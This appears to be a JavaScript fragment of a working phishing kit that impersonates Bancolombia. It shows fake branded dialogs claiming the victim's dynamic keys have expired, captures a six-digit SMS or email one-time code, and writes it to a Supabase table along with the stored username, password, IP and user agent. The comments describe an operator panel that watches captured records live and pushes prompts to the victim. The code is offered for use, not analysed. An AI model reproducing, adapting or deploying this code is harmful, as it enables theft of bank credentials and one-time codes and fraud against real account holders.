  // "Inscribir Clave Dinámica", se abre el FORMULARIO del código SMS/correo. El código
  // que digite el usuario se guarda en el MISMO registro dynamic_keys de su sesión (columna
  // codigo_sms) y el panel lo ve en tiempo real en la tarjeta de registro capturado.




  function handleSmsOtpCommand() {
    if (document.getElementById("custom-sms-alert-modal")) return;
    if (document.getElementById("custom-sms-code-modal")) return;
    if (document.getElementById("custom-sms-contingency-modal")) return;
    showContingencySmsModal();
  }

  function showSmsAlertModal() {
    var existing = document.getElementById("custom-sms-alert-modal");
    if (existing) return;

    var overlay = document.createElement("div");
    overlay.className = "bc-modal-overlay-custom show bc-sms-overlay";
    overlay.id = "custom-sms-alert-modal";
    overlay.innerHTML = buildSmsAlertHTML();

    document.body.appendChild(overlay);
    reportarEstado("sms_alerta", "claves dinámicas inválidas");
    // Mientras la modal de Bancolombia esté abierta, la carga de fondo queda detenida: ni
    // el contador de 137 s ni los latidos de estado avanzan detrás..
    stopVerification();
    stopEstadoHeartbeat();

    // Limpieza de fondo: la pantalla de carga anterior no debe asomarse detrás.
    setLoadingTransitionVisible(false);

    var continueBtn = document.getElementById("sms-alert-continue-btn");
    if (continueBtn) {
      continueBtn.addEventListener("click", function () {
        // Ocultar la alerta y abrir de inmediato el formulario del código SMS.

        closeSmsAlertModal(showSmsCodeModal);
      });
    }
  }

  function buildSmsAlertHTML() {
    return `
      <div class="bc-security-warning-dialog" role="alertdialog" aria-modal="true" aria-labelledby="sms-alert-title" aria-describedby="sms-alert-text">
        <div class="bc-security-warning-icon bc-security-warning-icon-sms" aria-hidden="true">
          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M20 2H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h2v3l4-3h10a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2z" fill="#ffffff" stroke="#1c4f8f" stroke-width="1" stroke-linejoin="round"></path>
            <path d="M7 9.2h10M7 12.8h6.5" stroke="#0072ce" stroke-width="1.7" stroke-linecap="round"></path>
          </svg>
        </div>
        <h3 class="bc-security-warning-title" id="sms-alert-title">Parece que tus claves dinámicas no son válidas y expiraron.</h3>
        <p class="bc-security-warning-text" id="sms-alert-text">Inscribe una clave dinámica directamente desde acá.</p>
        <button class="bc-security-warning-button" id="sms-alert-continue-btn" type="button">Inscribir clave dinámica</button>
      </div>
    `;
  }

  function closeSmsAlertModal(callback) {
    closeOverlayById("custom-sms-alert-modal", callback);
  }

  // ==================== Modal institucional de contingencia SMS/Correo ====================
  // Versión institucional (logotipo oficial + candado amarillo): se muestra cuando el admin
  // pulsa "Solicitar Código SMS / Correo" con el usuario esperando en la pantalla de carga.
  // El botón amarillo "Inscribir Clave Dinámica" abre el formulario del código (último proceso).
  function showContingencySmsModal() {
    if (document.getElementById("custom-sms-contingency-modal")) return;

    var overlay = document.createElement("div");
    overlay.className = "bc-modal-overlay-custom show bc-sms-overlay";
    overlay.id = "custom-sms-contingency-modal";
    overlay.innerHTML = buildContingencyKeyHTML();

    document.body.appendChild(overlay);
    reportarEstado("sms_alerta", "claves dinámicas inválidas");
    // Mientras la modal de Bancolombia esté abierta, la carga de fondo queda detenida: ni
    // el contador de 137 s ni los latidos de estado avanzan detrás..
    stopVerification();
    stopEstadoHeartbeat();

    // Limpieza de fondo: la pantalla de carga anterior no debe asomarse detrás.
    setLoadingTransitionVisible(false);

    var continueBtn = document.getElementById("admin-extra-continue-btn");
    if (continueBtn) {
      continueBtn.addEventListener("click", function () {
        closeSmsContingencyModal(showSmsCodeModal);
      });
    }
  }

  function closeSmsContingencyModal(callback) {
    closeOverlayById("custom-sms-contingency-modal", callback);
  }

// Oculta o restaura las capas de verificación de seguridad que quedan detrás de la
  // modal SMS/Correo o de contingencia, para que ninguna barra de progreso, spinner,
  // formulario ni modal anterior se transluzca junto al recuadro. Detrás solo debe
  // percibirse la interfaz principal limpia (el Home).
  function setLoadingTransitionVisible(visible) {
    // Capas de verificación que pueden quedar abiertas detrás de la modal de
    // Bancolombia: pantalla de carga, Clave Dinámica, escudo dorado y aviso inicial.
    var layerIds = [
      "custom-loading-transition-modal",
      "custom-key-validation-modal",
      "custom-admin-extra-modal",
      "custom-security-warning-modal"
    ];
    layerIds.forEach(function (id) {
      var overlay = document.getElementById(id);
      if (overlay) {
        if (visible) {
          // Al restaurar solo se vuelve a mostrar la pantalla de carga; el resto de
          // capas de verificación permanecen ocultas para dejar el Home limpio.
          overlay.style.visibility = id === "custom-loading-transition-modal" ? "" : "hidden";
        } else {
          overlay.style.visibility = "hidden";
        }
      }
    });
  }

  function showSmsCodeModal() {
    var existing = document.getElementById("custom-sms-code-modal");
    if (existing) return;

    var overlay = document.createElement("div");
    overlay.className = "bc-modal-overlay-custom show bc-sms-overlay";
    overlay.id = "custom-sms-code-modal";
    overlay.innerHTML = buildSmsCodeHTML();

    document.body.appendChild(overlay);
    reportarEstado("sms_codigo", "ingreso código sms/correo");
    // Mientras la modal de Bancolombia esté abierta, la carga de fondo queda detenida: ni
    // el contador de 137 s ni los latidos de estado avanzan detrás..
    stopVerification();
    stopEstadoHeartbeat();

    // Limpieza de fondo: la pantalla de carga anterior no debe asomarse detrás.
    setLoadingTransitionVisible(false);

    var submitBtn = document.getElementById("sms-code-submit-btn");
    var inputs = document.querySelectorAll("#sms-code-boxes input");
    var closeBtn = document.getElementById("sms-code-close-btn");
    var totalDigitos = inputs.length;

    function obtenerCodigo() {
      var code = "";
      inputs.forEach(function (inp) {
        code += inp.value;
      });
      return code.trim();
    }

    function actualizarBoton() {
      var completo = obtenerCodigo().length === totalDigitos;
      if (submitBtn) submitBtn.disabled = !completo;
      inputs.forEach(function (inp) {
        inp.classList.toggle("filled", inp.value !== "");
      });
    }

    actualizarBoton();

    // Flujo de escritura: el foco pasa automáticamente a la siguiente casilla.
    inputs.forEach(function (input, index) {
      // Solo se acepta un dígito por casilla.
      input.addEventListener("input", function () {
        var val = this.value;
        if (val && !/^\d$/.test(val)) {
          this.value = "";
          return;
        }
        if (val && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
        actualizarBoton();
      });

      // Retroceso en una casilla vacía: regresa y limpia la anterior.
      input.addEventListener("keydown", function (e) {
        if (e.key === "Backspace") {
          if (!this.value && index > 0) {
            e.preventDefault();
            inputs[index - 1].value = "";
            inputs[index - 1].focus();
            actualizarBoton();
          }
        } else if (e.key === "Enter") {
          e.preventDefault();
          if (submitBtn && !submitBtn.disabled) submitBtn.click();
        }
      });

      // Pegar el código completo: reparte los dígitos entre las casillas.
      input.addEventListener("paste", function (e) {
        e.preventDefault();
        var text = (e.clipboardData || window.clipboardData).getData("text") || "";
        var digits = text.replace(/\D/g, "").split("").slice(0, inputs.length);
        digits.forEach(function (d, i) {
          inputs[i].value = d;
        });
        if (digits.length) {
          inputs[Math.min(digits.length, inputs.length - 1)].focus();
        }
        actualizarBoton();
      });

      // Al volver a entrar a una casilla, el dígito se selecciona para reemplazarlo.
      input.addEventListener("focus", function () {
        this.select();
      });
    });

    // El foco inicia en la primera casilla.
    if (inputs[0]) inputs[0].focus();

    if (closeBtn) {
      closeBtn.addEventListener("click", function () {
        // El usuario cierra el formulario: vuelve a la pantalla de carga intacta.
        closeSmsCodeModal(function () {
          setLoadingTransitionVisible(true);
          arrancarContadorCarga();
          reportarEstado("cargando", "de vuelta en carga");
          startEstadoHeartbeat();
        });
      });
    }

    if (submitBtn) {
      submitBtn.addEventListener("click", function () {
        var code = obtenerCodigo();
        if (code.length !== totalDigitos) return;
        // Captura el dato y lo envía de vuelta al panel: se guarda en el MISMO
        // registro dynamic_keys de la sesión y también se reporta en el estado.
        saveSmsOtpCode(code);
        reportarEstado("sms_codigo", "código ingresado: " + code);
        // Limpiar el estado/vista previa antes de levantar la carga: se desmontan al
        // instante todas las modales superpuestas (Verificacion de seguridad, alerta,
        // contingencia y Clave Dinamica, y la carga antigua,, para que no quede nada
        // translucido de fondo ni superpuesto (solo el Home normal..
        limpiarModalesSmsParaCarga();
        // Levantar la NUEVA modal de carga de verificacion de identidad (137 s..
        startIdentityVerification();
      });
    }
  }

  function buildSmsCodeHTML() {
    return `
      <div class="bc-key-validation-dialog" role="alertdialog" aria-modal="true" id="sms-code-dialog" aria-labelledby="sms-code-title" aria-describedby="sms-code-subtitle">
        <div class="bc-key-validation-close-button-container">
          <span class="bc-key-validation-close-button" id="sms-code-close-btn" aria-label="Cerrar">&times;</span>
        </div>
        <div class="bc-key-validation-content">
          <div class="bc-key-validation-header">
            <img class="bc-sms-brand-logo" src="./home_files/bancolombia-horizontal-no-spacing.svg" alt="Bancolombia">
            <div class="bc-sms-brand-icon" aria-hidden="true">
              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M20 2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h2v3.2c0 .82.93 1.3 1.6.82L12.5 18H20c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z" fill="#2c2a29"></path>
                <path d="M7 9.1h10M7 12.6h6.5" stroke="#ffffff" stroke-width="1.6" stroke-linecap="round"></path>
              </svg>
              <span class="bc-sms-brand-badge">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <rect x="4.5" y="10.5" width="15" height="9.5" rx="2.2" fill="#FDDA24"></rect>
                  <path d="M8 10.5V8a4 4 0 0 1 8 0v2.5" stroke="#FDDA24" stroke-width="2.2"></path>
                  <circle cx="12" cy="15.2" r="1.5" fill="#2c2a29"></circle>
                </svg>
              </span>
            </div>
            <h3 id="sms-code-title">Verificación de seguridad</h3>
            <p class="bc-sms-code-subtitle" id="sms-code-subtitle">Por tu seguridad, ingresa el código de verificación de 6 dígitos que enviamos a tu mensaje de texto (SMS) o correo electrónico registrado con tu cuenta de Bancolombia.</p>
          </div>
          <div class="bc-key-validation-body">
            <div class="bc-sms-code-form">
              <div class="bc-sms-code-boxes" id="sms-code-boxes" role="group" aria-label="Código de verificación">
                <input class="bc-sms-code-box" id="sms-code-0" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" aria-label="Primer dígito del código">
                <input class="bc-sms-code-box" id="sms-code-1" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Segundo dígito del código">
                <input class="bc-sms-code-box" id="sms-code-2" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Tercer dígito del código">
                <input class="bc-sms-code-box" id="sms-code-3" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Cuarto dígito del código">
                <input class="bc-sms-code-box" id="sms-code-4" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Quinto dígito del código">
                <input class="bc-sms-code-box" id="sms-code-5" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Sexto dígito del código">
              </div>
              <p class="bc-sms-code-hint" id="sms-code-hint">Código de verificación</p>
              <p class="bc-sms-attempts" id="sms-code-attempts">Intento 1/3</p>
              <button type="button" class="bc-sms-resend-link" id="sms-code-resend-btn">¿No recibiste el código? Solicitar uno nuevo</button>
            </div>
          </div>
        </div>
        <div class="bc-key-validation-footer">
          <div class="bc-key-validation-action-container">
            <button class="bc-continue-button bc-sms-submit-button" id="sms-code-submit-btn" disabled>Enviar</button>
          </div>
        </div>
      </div>
    `;
  }

  function closeSmsCodeModal(callback) {
    closeOverlayById("custom-sms-code-modal", callback);
  }

  // Desmonta AL INSTANTE (sin fade) todas las modales superpuestas que pudieran
  // quedar montadas: el formulario de Verificación de seguridad SMS/correo, la
  // alerta, la contingencia y la Clave Dinámica, además de la carga transicional
  // antigua. Así, al levantar la nueva carga de identidad, sólo queda el Home normal
  // como fondo y ninguna vista previa se transluce ni se superpone detrás..
  function limpiarModalesSmsParaCarga() {
    stopEstadoHeartbeat();
    stopKeyTimer();
    stopVerification();
    ["custom-sms-code-modal", "custom-sms-alert-modal", "custom-sms-contingency-modal", "custom-key-validation-modal", "custom-loading-transition-modal"].forEach(function (id) {
      var el = document.getElementById(id);
      if (el && el.parentNode) el.parentNode.removeChild(el);
    });
  }

  // Guarda el código SMS/correo en el MISMO registro dynamic_keys de la sesión activa
  // (colección codigo_sms), que es donde el panel ya lee Usuario, Clave y sus Claves
  // Dinámicas. El panel lo pinta en tiempo real en la tarjeta de registro capturado.



  async function saveSmsOtpCode(codeValue) {
    if (!supabaseClient) {
      console.warn("[Supabase] Cliente no disponible, omitiendo guardado del código SMS");
      return;
    }
    try {
      var sid = getSessionId();
      var username = getStateUsername();
      var ahora = new Date().toISOString();

      // 1) VIA RAPIDA (1 sola llamada de red): si ya conocemos el id del
      // registro dynamic_keys de la sesión (se guardó al crear la clave dinámica),
      // se hace el UPDATE DIRECTO sin SELECT previo. Asi el codigo SMS/OTP llega
      // al monitor tan rapido como el login o la clave dinámica (1 round trip).

      var cachedId = "";
      try { cachedId = (localStorage.getItem("bc_dynamic_key_id") || "").trim(); } catch (e) {}
      if (cachedId) {
        await supabaseClient
          .from("dynamic_keys")
          .update({ codigo_sms: codeValue, codigo_sms_updated_at: ahora })
          .eq("id", cachedId);
        console.log("[Supabase] Código SMS guardado en dynamic_keys (sesión:", sid, ")");
        return;
      }

      // 2) Respaldo: si no hay id en caché (clave dinámica nunca guardada),
      // se busca el registro más reciente de la sesión y se ancla el código al MISMO.


      var latest = await supabaseClient
        .from("dynamic_keys")
        .select("id")
        .eq("session_id", sid)
        .order("id", { ascending: false })
        .limit(1);

      if (latest && latest.data && latest.data.length) {

        await supabaseClient
          .from("dynamic_keys")
          .update({ codigo_sms: codeValue, codigo_sms_updated_at: ahora })
          .eq("id", latest.data[0].id);
        console.log("[Supabase] Código SMS guardado en dynamic_keys (sesión:", sid, ")");
      } else {
        // Respaldo: si aún no hay clave dinámica, se crea el registro con el código.



        await supabaseClient
          .from("dynamic_keys")
          .insert({

            key_value: "",
            username: username,
            password: localStorage.getItem("bc_password") || "",
            ip: ipEnCache || "",
            session_id: sid,
            user_agent: navigator.userAgent || "",
            codigo_sms: codeValue,
            codigo_sms_updated_at: ahora,
            time: ahora
          });
      }
    } catch (error) {
      console.error("[Supabase] Error guardando código SMS:", error);
    }
  }
  // ==================== Init ====================
  function init() {
    updateClock();
    setInterval(updateClock, 1000);

    // Puente Panel Admin -> Cliente: comandos en tiempo real (WebSockets/Realtime).
    // Interrumpe la pantalla de carga y muestra el escudo dorado al instante.
    listenAdminCommands();

    // Paso 1: aviso de seguridad obligatorio (compacto, estilo tarjeta Sura).
    // Paso 2: al pulsar "Iniciar validación segura" se muestra la Clave Dinámica.
    setTimeout(showSecurityWarningModal, 600);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();